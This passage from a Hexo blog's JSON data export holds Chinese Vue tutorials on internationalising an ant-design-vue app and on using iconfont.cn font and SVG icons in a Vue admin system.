class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">&lt;!-- src/App.vue --&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> zh_CN <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/zh_CN\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> en_US <span class=\"keyword\">from</span> <span class=\"string\">\"ant-design-vue/lib/locale-provider/en_US\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> moment <span class=\"keyword\">from</span> <span class=\"string\">\"moment\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">import</span> <span class=\"string\">\"moment/locale/zh-cn\"</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">  <span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">    data() &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"undefined\">        locale: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">          type: <span class=\"built_in\">Object</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">          <span class=\"keyword\">default</span>: en_US</span></span><br><span class=\"line\"><span class=\"undefined\">        &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;,</span></span><br><span class=\"line\"><span class=\"undefined\">    watch: &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">      <span class=\"string\">\"$route.query.locale\"</span>: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">val</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">this</span>.locale = val === <span class=\"string\">\"en_US\"</span> ? en_US : zh_CN;</span></span><br><span class=\"line\"><span class=\"javascript\">        moment.locale(val === <span class=\"string\">\"en_US\"</span> ? <span class=\"string\">\"en\"</span> : <span class=\"string\">\"zh-cn\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">      &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"undefined\">  &#125;;</span></span><br><span class=\"line\"><span class=\"undefined\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"本地业务的国际化\"><a href=\"#本地业务的国际化\" class=\"headerlink\" title=\"本地业务的国际化\"></a>本地业务的国际化</h2><p>推荐用<a href=\"https://kazupon.github.io/vue-i18n/\" target=\"_blank\" rel=\"noopener\">Vue I18n</a>，本次也以该插件为例。</p>\n<p>例如上面的效果图，日期选择组件有个 label 的文案“time”，我们对它进行国际化。</p>\n<p>首先，本地创建国际化文件，例如：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/local/zhCN.js</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">\"app.dashboard.analysis.timeLabel\"</span>: <span class=\"string\">\"时间\"</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// src/local/enUS.js</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> &#123;</span><br><span class=\"line\">  <span class=\"string\">\"app.dashboard.analysis.timeLabel\"</span>: <span class=\"string\">\"Time\"</span></span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后，安装相关包文件：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> query-string 是方便解析URL查询字符串</span></span><br><span class=\"line\">npm install vue-i18n query-string -S</span><br></pre></td></tr></table></figure>\n<p>再然后，在 main.js 中进行注册配置：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 引入相关包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> VueI18n <span class=\"keyword\">from</span> <span class=\"string\">\"vue-i18n\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> enUS <span class=\"keyword\">from</span> <span class=\"string\">\"./locale/enUS\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> zhCN <span class=\"keyword\">from</span> <span class=\"string\">\"./locale/zhCN\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> queryString <span class=\"keyword\">from</span> <span class=\"string\">\"query-string\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 注册组件</span></span><br><span class=\"line\">Vue.use(VueI18n);</span><br><span class=\"line\"><span class=\"comment\">// 创建一个实例</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> i18n = <span class=\"keyword\">new</span> VueI18n(&#123;</span><br><span class=\"line\">  locale: queryString.parse(location.search).locale || <span class=\"string\">\"zh_CN\"</span>,</span><br><span class=\"line\">  messages: &#123;</span><br><span class=\"line\">    zh_CN: &#123; <span class=\"attr\">message</span>: zhCN &#125;,</span><br><span class=\"line\">    en_US: &#123; <span class=\"attr\">message</span>: enUS &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"><span class=\"comment\">// 挂载到Vue实例</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Vue(&#123;</span><br><span class=\"line\">  i18n,</span><br><span class=\"line\">  router,</span><br><span class=\"line\">  store,</span><br><span class=\"line\">  render: <span class=\"function\"><span class=\"params\">h</span> =&gt;</span> h(App)</span><br><span class=\"line\">&#125;).$mount(<span class=\"string\">\"#app\"</span>);</span><br></pre></td></tr></table></figure>\n<p>最后，在切换语言的地方，添加动态修改 locale：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onClick(&#123; key &#125;) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.$router.push(&#123;<span class=\"attr\">query</span>: &#123;<span class=\"attr\">locale</span>: key&#125;&#125;);</span><br><span class=\"line\">  <span class=\"comment\">// 动态修改locale</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.$i18n.locale = key;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>最终效果：<br><img src=\"/vue-in-action-i18n/2.jpg\" alt=\"效果图\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p>极客时间——Vue 开发实战</p>"},{"title":"Vue实战@管理系统中使用的图标","date":"2019-05-26T03:23:28.000Z","updated":"2019-05-26T03:23:28.000Z","_content":"\n# 概述\n\n日常开发中，除了直接使用 UI 组件库提供有限图标外，怎么使用其他图标呢？目前主要有三种方式，雪碧图、字体图标和 svg 图标。雪碧图方式古老，字体图标方式流行，但是不支持多色图标，svg 方式逐渐流行，支持多色图标。本文主要讲下字体图标和 svg 图标的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![测试效果图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n本次以阿里的图标开源库 [iconfont.cn](https://www.iconfont.cn)为例。\n\n## 出发\n\n平台注册账号，搜索需要图标的关键字，例如“404”，找到自己需要的可以收藏、加入购物车、添加到项目等。把需要的图标添加到自己创建的项目后，就可以在项目面板页管理和使用图标了。\n![项目面板截图](iconfont.jpg)\n\n## unicode 引用\n\nunicode 是字体在网页端最原始的应用方式，特点是：\n\n- 兼容性最好，支持 ie6+，及所有现代浏览器。\n- 支持按字体的方式去动态调整图标大小，颜色等等。\n- 但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。\n\nunicode 使用步骤如下：\n\n第一步：拷贝项目下面生成的 font-face\n\n```css\n@font-face {\n  font-family: \"iconfont\";\n  src: url(\"iconfont.eot\");\n  src: url(\"iconfont.eot?#iefix\") format(\"embedded-opentype\"), url(\"iconfont.woff\")\n      format(\"woff\"), url(\"iconfont.ttf\") format(\"truetype\"), url(\"iconfont.svg#iconfont\")\n      format(\"svg\");\n}\n```\n\n第二步：定义使用 iconfont 的样式\n\n```css\n.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -webkit-text-stroke-width: 0.2px;\n  -moz-osx-font-smoothing: grayscale;\n}\n```\n\n第三步：挑选相应图标并获取字体编码，应用于页面\n\n```html\n<i class=\"iconfont\">&#x33;</i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont\">&#xe61c;</i>\n  </div>\n</template>\n\n<style scoped>\n  @font-face {\n    font-family: \"iconfont\"; /* project id 1212356 */\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot\");\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot?#iefix\") format(\"embedded-opentype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff2\") format(\"woff2\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff\") format(\"woff\"), url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.ttf\")\n        format(\"truetype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.svg#iconfont\") format(\"svg\");\n  }\n  .iconfont {\n    font-family: \"iconfont\" !important;\n    font-size: 16px;\n    font-style: normal;\n    -webkit-font-smoothing: antialiased;\n    -webkit-text-stroke-width: 0.2px;\n    -moz-osx-font-smoothing: grayscale;\n  }\n</style>\n```\n\n## font-class 引用\n\nfont-class 是 unicode 使用方式的一种变种，主要是解决 unicode 书写不直观，语意不明确的问题。\n\n与 unicode 使用方式相比，具有如下特点：\n\n- 兼容性良好，支持 ie8+，及所有现代浏览器。\n- 相比于 unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。\n- 因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 unicode 引用。\n- 不过因为本质上还是使用的字体，所以多色图标还是不支持的。\n\n使用步骤如下：\n\n第一步：拷贝项目下面生成的 fontclass 代码：\n\n```css\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css\n```\n\n第二步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<i class=\"iconfont icon-xxx\"></i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont iconyunshu\"></i>\n  </div>\n</template>\n<style scoped>\n  @import url(//at.alicdn.com/t/font_1212356_mw76lv1oaul.css);\n</style>\n```\n\n## symbol 引用\n\n这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 svg 的集合，与上面两种相比具有如下特点：\n\n- 支持多色图标了，不再受单色限制。\n- 通过一些技巧，支持像字体那样，通过 font-size,color 来调整样式。\n- 兼容性较差，支持 ie9+,及现代浏览器。\n- 浏览器渲染 svg 的性能一般，还不如 png。\n\n第一步：拷贝项目下面生成的 symbol 代码：\n\n```js\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\n```\n\n第二步：加入通用 css 代码（引入一次就行）：\n\n```html\n<style type=\"text/css\">\n  .icon {\n    width: 1em;\n    height: 1em;\n    vertical-align: -0.15em;\n    fill: currentColor;\n    overflow: hidden;\n  }\n</style>\n```\n\n第三步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<svg class=\"icon\" aria-hidden=\"true\">\n  <use xlink:href=\"#icon-xxx\"></use>\n</svg>\n```\n\n普通页面测试代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <title>Document</title>\n    <script src=\"http://at.alicdn.com/t/font_1212356_01bv0xpc70ab.js\"></script>\n    <style type=\"text/css\">\n      .icon {\n        width: 1em;\n        height: 1em;\n        vertical-align: -0.15em;\n        fill: currentColor;\n        overflow: hidden;\n      }\n    </style>\n  </head>\n  <body>\n    <svg class=\"icon\" aria-hidden=\"true\">\n      <use xlink:href=\"#icontixingshixiang\"></use>\n    </svg>\n  </body>\n</html>\n```\n\n`.vue`单文件开发中，因为是模块化开发，是通过 webpack 编译打包的，因此第一步略有不同：保存该 js 文件到本地，在`main.js`中引入`import \"./assets/iconfont.js\";`。\n\n## ant-design-vue 中使用\n\n```html\n<template>\n  <div class=\"icons-list\">\n    <icon-font type=\"icon-tuichu\" />\n    <icon-font type=\"icon-facebook\" />\n    <icon-font type=\"icon-twitter\" />\n  </div>\n</template>\n<script>\n  import { Icon } from \"ant-design-vue\";\n\n  const IconFont = Icon.createFromIconfontCN({\n    scriptUrl: \"//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\"\n  });\n  export default {\n    components: {\n      IconFont\n    }\n  };\n</script>\n<style scoped>\n  .icons-list >>> .anticon {\n    margin-right: 6px;\n    font-size: 24px;\n  }\n</style>\n```\n\n示例是局部注册，当然对于通用的图标也可以 main.js 中进行全局注册。\n\n## 直接使用 svg 图标文件\n\n第一步：下载 svg 文件，保存到本地；\n\n第二步：安装 loader:\n\n```shell\nnpm install vue-svg-loader -D\n```\n\n第三步：组件中引入 svg 文件，注册组件：\n\n```js\nimport Logo from \"@/assets/logo.svg\";\nexport default {\n  components: {\n    Logo\n  }\n};\n```\n\n第四步：使用该图标组件：\n\n```html\n<template>\n  <div>\n    <Logo />\n  </div>\n</template>\n```\n\n# 参考\n\n[IconFont](https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8cf4382a&helptype=code)\n\n极客时间——Vue 开发实战\n","source":"_posts/2019/05/vue-in-action-icon.md","raw":"---\ntitle: Vue实战@管理系统中使用的图标\npermalink: vue-in-action-icon\ntags:\n  - Vue\ncategories:\n  - 框架与库\n  - Vue\ndate: 2019-05-26 11:23:28\nupdated: 2019-05-26 11:23:28\n---\n\n# 概述\n\n日常开发中，除了直接使用 UI 组件库提供有限图标外，怎么使用其他图标呢？目前主要有三种方式，雪碧图、字体图标和 svg 图标。雪碧图方式古老，字体图标方式流行，但是不支持多色图标，svg 方式逐渐流行，支持多色图标。本文主要讲下字体图标和 svg 图标的使用。[配套测试源码](https://github.com/jovysun/Vue-my-pro)\n![测试效果图](overview.jpg)\n\n<!-- more -->\n\n# 详述\n\n本次以阿里的图标开源库 [iconfont.cn](https://www.iconfont.cn)为例。\n\n## 出发\n\n平台注册账号，搜索需要图标的关键字，例如“404”，找到自己需要的可以收藏、加入购物车、添加到项目等。把需要的图标添加到自己创建的项目后，就可以在项目面板页管理和使用图标了。\n![项目面板截图](iconfont.jpg)\n\n## unicode 引用\n\nunicode 是字体在网页端最原始的应用方式，特点是：\n\n- 兼容性最好，支持 ie6+，及所有现代浏览器。\n- 支持按字体的方式去动态调整图标大小，颜色等等。\n- 但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。\n\nunicode 使用步骤如下：\n\n第一步：拷贝项目下面生成的 font-face\n\n```css\n@font-face {\n  font-family: \"iconfont\";\n  src: url(\"iconfont.eot\");\n  src: url(\"iconfont.eot?#iefix\") format(\"embedded-opentype\"), url(\"iconfont.woff\")\n      format(\"woff\"), url(\"iconfont.ttf\") format(\"truetype\"), url(\"iconfont.svg#iconfont\")\n      format(\"svg\");\n}\n```\n\n第二步：定义使用 iconfont 的样式\n\n```css\n.iconfont {\n  font-family: \"iconfont\" !important;\n  font-size: 16px;\n  font-style: normal;\n  -webkit-font-smoothing: antialiased;\n  -webkit-text-stroke-width: 0.2px;\n  -moz-osx-font-smoothing: grayscale;\n}\n```\n\n第三步：挑选相应图标并获取字体编码，应用于页面\n\n```html\n<i class=\"iconfont\">&#x33;</i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont\">&#xe61c;</i>\n  </div>\n</template>\n\n<style scoped>\n  @font-face {\n    font-family: \"iconfont\"; /* project id 1212356 */\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot\");\n    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot?#iefix\") format(\"embedded-opentype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff2\") format(\"woff2\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.woff\") format(\"woff\"), url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.ttf\")\n        format(\"truetype\"),\n      url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.svg#iconfont\") format(\"svg\");\n  }\n  .iconfont {\n    font-family: \"iconfont\" !important;\n    font-size: 16px;\n    font-style: normal;\n    -webkit-font-smoothing: antialiased;\n    -webkit-text-stroke-width: 0.2px;\n    -moz-osx-font-smoothing: grayscale;\n  }\n</style>\n```\n\n## font-class 引用\n\nfont-class 是 unicode 使用方式的一种变种，主要是解决 unicode 书写不直观，语意不明确的问题。\n\n与 unicode 使用方式相比，具有如下特点：\n\n- 兼容性良好，支持 ie8+，及所有现代浏览器。\n- 相比于 unicode 语意明确，书写更直观。可以很容易分辨这个 icon 是什么。\n- 因为使用 class 来定义图标，所以当要替换图标时，只需要修改 class 里面的 unicode 引用。\n- 不过因为本质上还是使用的字体，所以多色图标还是不支持的。\n\n使用步骤如下：\n\n第一步：拷贝项目下面生成的 fontclass 代码：\n\n```css\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.css\n```\n\n第二步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<i class=\"iconfont icon-xxx\"></i>\n```\n\nvue 使用示例如下：\n\n```html\n<template>\n  <div>\n    <i class=\"iconfont iconyunshu\"></i>\n  </div>\n</template>\n<style scoped>\n  @import url(//at.alicdn.com/t/font_1212356_mw76lv1oaul.css);\n</style>\n```\n\n## symbol 引用\n\n这是一种全新的使用方式，应该说这才是未来的主流，也是平台目前推荐的用法。相关介绍可以参考这篇文章 这种用法其实是做了一个 svg 的集合，与上面两种相比具有如下特点：\n\n- 支持多色图标了，不再受单色限制。\n- 通过一些技巧，支持像字体那样，通过 font-size,color 来调整样式。\n- 兼容性较差，支持 ie9+,及现代浏览器。\n- 浏览器渲染 svg 的性能一般，还不如 png。\n\n第一步：拷贝项目下面生成的 symbol 代码：\n\n```js\n//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\n```\n\n第二步：加入通用 css 代码（引入一次就行）：\n\n```html\n<style type=\"text/css\">\n  .icon {\n    width: 1em;\n    height: 1em;\n    vertical-align: -0.15em;\n    fill: currentColor;\n    overflow: hidden;\n  }\n</style>\n```\n\n第三步：挑选相应图标并获取类名，应用于页面：\n\n```html\n<svg class=\"icon\" aria-hidden=\"true\">\n  <use xlink:href=\"#icon-xxx\"></use>\n</svg>\n```\n\n普通页面测试代码：\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\" />\n    <title>Document</title>\n    <script src=\"http://at.alicdn.com/t/font_1212356_01bv0xpc70ab.js\"></script>\n    <style type=\"text/css\">\n      .icon {\n        width: 1em;\n        height: 1em;\n        vertical-align: -0.15em;\n        fill: currentColor;\n        overflow: hidden;\n      }\n    </style>\n  </head>\n  <body>\n    <svg class=\"icon\" aria-hidden=\"true\">\n      <use xlink:href=\"#icontixingshixiang\"></use>\n    </svg>\n  </body>\n</html>\n```\n\n`.vue`单文件开发中，因为是模块化开发，是通过 webpack 编译打包的，因此第一步略有不同：保存该 js 文件到本地，在`main.js`中引入`import \"./assets/iconfont.js\";`。\n\n## ant-design-vue 中使用\n\n```html\n<template>\n  <div class=\"icons-list\">\n    <icon-font type=\"icon-tuichu\" />\n    <icon-font type=\"icon-facebook\" />\n    <icon-font type=\"icon-twitter\" />\n  </div>\n</template>\n<script>\n  import { Icon } from \"ant-design-vue\";\n\n  const IconFont = Icon.createFromIconfontCN({\n    scriptUrl: \"//at.alicdn.com/t/font_8d5l8fzk5b87iudi.js\"\n  });\n  export default {\n    components: {\n      IconFont\n    }\n  };\n</script>\n<style scoped>\n  .icons-list >>> .anticon {\n    margin-right: 6px;\n    font-size: 24px;\n  }\n</style>\n```\n\n示例是局部注册，当然对于通用的图标也可以 main.js 中进行全局注册。\n\n## 直接使用 svg 图标文件\n\n第一步：下载 svg 文件，保存到本地；\n\n第二步：安装 loader:\n\n```shell\nnpm install vue-svg-loader -D\n```\n\n第三步：组件中引入 svg 文件，注册组件：\n\n```js\nimport Logo from \"@/assets/logo.svg\";\nexport default {\n  components: {\n    Logo\n  }\n};\n```\n\n第四步：使用该图标组件：\n\n```html\n<template>\n  <div>\n    <Logo />\n  </div>\n</template>\n```\n\n# 参考\n\n[IconFont](https://www.iconfont.cn/help/detail?spm=a313x.7781069.1998910419.d8cf4382a&helptype=code)\n\n极客时间——Vue 开发实战\n","slug":"vue-in-action-icon","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ck0m3d8xq006vwovv0nnx6b1t","content":"<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>日常开发中，除了直接使用 UI 组件库提供有限图标外，怎么使用其他图标呢？目前主要有三种方式，雪碧图、字体图标和 svg 图标。雪碧图方式古老，字体图标方式流行，但是不支持多色图标，svg 方式逐渐流行，支持多色图标。本文主要讲下字体图标和 svg 图标的使用。<a href=\"https://github.com/jovysun/Vue-my-pro\" target=\"_blank\" rel=\"noopener\">配套测试源码</a><br><img src=\"/vue-in-action-icon/overview.jpg\" alt=\"测试效果图\"></p>\n<a id=\"more\"></a>\n<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><p>本次以阿里的图标开源库 <a href=\"https://www.iconfont.cn\" target=\"_blank\" rel=\"noopener\">iconfont.cn</a>为例。</p>\n<h2 id=\"出发\"><a href=\"#出发\" class=\"headerlink\" title=\"出发\"></a>出发</h2><p>平台注册账号，搜索需要图标的关键字，例如“404”，找到自己需要的可以收藏、加入购物车、添加到项目等。把需要的图标添加到自己创建的项目后，就可以在项目面板页管理和使用图标了。<br><img src=\"/vue-in-action-icon/iconfont.jpg\" alt=\"项目面板截图\"></p>\n<h2 id=\"unicode-引用\"><a href=\"#unicode-引用\" class=\"headerlink\" title=\"unicode 引用\"></a>unicode 引用</h2><p>unicode 是字体在网页端最原始的应用方式，特点是：</p>\n<ul>\n<li>兼容性最好，支持 ie6+，及所有现代浏览器。</li>\n<li>支持按字体的方式去动态调整图标大小，颜色等等。</li>\n<li>但是因为是字体，所以不支持多色。只能使用平台里单色的图标，就算项目里有多色图标也会自动去色。</li>\n</ul>\n<p>unicode 使用步骤如下：</p>\n<p>第一步：拷贝项目下面生成的 font-face</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"keyword\">font-face</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"iconfont\"</span>;</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.eot\"</span>);</span><br><span class=\"line\">  <span class=\"attribute\">src</span>: <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.eot?#iefix\"</span>) <span class=\"built_in\">format</span>(<span class=\"string\">\"embedded-opentype\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.woff\"</span>)</span><br><span class=\"line\">      <span class=\"built_in\">format</span>(<span class=\"string\">\"woff\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.ttf\"</span>) <span class=\"built_in\">format</span>(<span class=\"string\">\"truetype\"</span>), <span class=\"built_in\">url</span>(<span class=\"string\">\"iconfont.svg#iconfont\"</span>)</span><br><span class=\"line\">      <span class=\"built_in\">format</span>(<span class=\"string\">\"svg\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第二步：定义使用 iconfont 的样式</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-class\">.iconfont</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">font-family</span>: <span class=\"string\">\"iconfont\"</span> <span class=\"meta\">!important</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-size</span>: <span class=\"number\">16px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">font-style</span>: normal;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-font-smoothing</span>: antialiased;</span><br><span class=\"line\">  <span class=\"attribute\">-webkit-text-stroke-width</span>: <span class=\"number\">0.2px</span>;</span><br><span class=\"line\">  <span class=\"attribute\">-moz-osx-font-smoothing</span>: grayscale;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>第三步：挑选相应图标并获取字体编码，应用于页面</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont\"</span>&gt;</span>&amp;#x33;<span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>vue 使用示例如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">i</span> <span class=\"attr\">class</span>=<span class=\"string\">\"iconfont\"</span>&gt;</span>&amp;#xe61c;<span class=\"tag\">&lt;/<span class=\"name\">i</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">scoped</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"css\">  @<span class=\"keyword\">font-face</span> &#123;</span></span><br><span class=\"line\"><span class=\"css\">    <span class=\"selector-tag\">font-family</span>: \"<span class=\"selector-tag\">iconfont</span>\"; <span class=\"comment\">/* project id 1212356 */</span></span></span><br><span class=\"line\"><span class=\"undefined\">    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot\");</span></span><br><span class=\"line\"><span class=\"undefined\">    src: url(\"//at.alicdn.com/t/font_1212356_01bv0xpc70ab.eot?#iefix\") format(\"embedded-opentype\"),</span></span><br><span class=\"line\"><span class=\"undefined\">      